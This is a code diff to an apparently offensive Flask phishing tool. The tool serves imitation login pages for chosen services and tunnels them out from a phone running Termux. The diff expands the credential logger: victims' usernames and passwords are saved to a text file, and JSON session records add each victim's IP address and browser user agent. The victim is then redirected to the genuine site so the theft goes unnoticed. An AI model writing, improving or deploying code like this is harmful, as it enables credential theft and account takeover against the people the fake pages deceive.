@@ -1,12 +1,13 @@
-from flask import Flask, request, render_template, redirect
+from flask import Flask, request, render_template, redirect, url_for
 from datetime import datetime
 import os
 import subprocess
 import shutil
 import time
 import sys
+import json
 
-app = Flask(__name__, template_folder="templates")
+app = Flask(__name__, template_folder="templates", static_folder="static")
 
 # ASCII Banner
 def show_banner():
@@ -19,10 +20,27 @@ def show_banner():
  ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
     """)
 
-# Log credentials
-def log_credentials(username, password, service):
-    with open('credentials.txt', 'a') as f:
-        f.write(f"[{datetime.now()}] {service}: {username}:{password}\n")
+# Save credentials and session data
+def log_data(username, password, service, ip, user_agent):
+    os.makedirs("logs", exist_ok=True)
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Save credentials
+    with open('logs/credentials.txt', 'a') as f:
+        f.write(f"[{timestamp}] {service}: {username}:{password}\n")
+    
+    # Save session (JSON format)
+    session_data = {
+        "timestamp": timestamp,
+        "service": service,
+        "username": username,
+        "password": password,
+        "ip": ip,
+        "user_agent": user_agent
+    }
+    with open('logs/sessions.json', 'a') as f:
+        json.dump(session_data, f)
+        f.write("\n")  # Newline for each entry
 
 # Check if running on Termux (Android)
 def is_termux():
@@ -102,10 +120,14 @@ def setup():
 
     @app.route('/login', methods=['POST'])
     def login():
-        username = request.form.get('username') or request.form.get('email")
-        password = request.form.get('password') or request.form.get('pass")
+        username = request.form.get('username') or request.form.get('email')
+        password = request.form.get('password') or request.form.get('pass')
         service = services[choice]["template"].replace('.html', '')
-        log_credentials(username, password, service)
+        ip = request.remote_addr
+        user_agent = request.headers.get('User-Agent', 'Unknown')
+        
+        # Log data
+        log_data(username, password, service, ip, user_agent)
         return redirect(services[choice]["redirect"], code=302)
 
     # Start tunnel
